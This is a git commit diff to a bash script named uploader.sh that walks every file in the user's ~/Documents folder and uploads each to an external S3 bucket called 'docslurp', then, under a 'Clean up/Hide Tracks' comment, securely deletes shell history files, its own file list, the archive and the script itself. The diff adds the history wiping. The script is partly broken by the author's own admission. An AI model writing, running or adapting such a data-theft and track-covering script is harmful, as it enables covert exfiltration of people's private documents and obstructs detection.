d853810aadb78b97af654c375792e5186f1e7cde
Lost <lostincynicism@gmail.com>
2014-08-29 09:32:13 -0500

    more changes, still not ready

--- uploader.sh
+++ uploader.sh
@@ -1,14 +1,15 @@
 #!/bin/bash
 
-key_id="http://link-to-key-file.com/key"
-key_secret="http://link-to-secret-key-file.com/secret-key"
-path="data/$file"
+#Edit and uncomment key_id and key_secret to the link where your AWS key is
+#key_id="$(curl -s https://link-to-key-file.com/key)"
+#key_secret="$(curl -s https://link-to-secret-key-file.com/secret-key)"
+$file="$n.zip"
+fpath="data/$file"
 bucket="docslurp"
 content_type="application/octet-stream"
 date="$(LC_ALL=C date -u +"%a, %d %b %Y %X %z")"
 md5="$(openssl md5 -binary < "$file" | base64)"
-distro="$(cat /proc/version)"
-sig="$(printf "PUT\n$md5\n$content_type\n$date\n/$bucket/$path" | openssl sha1 -binary -hmac "$key_secret" | base64)"
+sig="$(printf "PUT\n$md5\n$content_type\n$date\n/$bucket/$fpath" | openssl sha1 -binary -hmac "$key_secret" | base64)"
 
 #Get a list of all files in ~/Documents
 find ~/Documents -type f >> /tmp/files
@@ -22,11 +23,13 @@ curl -T $file http://$bucket.s3.amazonaws.com/$path \
 }
 
 for n in $(cat /tmp/files); do
-	
+
 	upload_files $n
 done
 
 # Clean up/Hide Tracks
+srm -m ~/.*_history
+srm -m /tmp/files
 srm -m docs.zip
 srm -m uploader.sh
 srm -m nohup.out
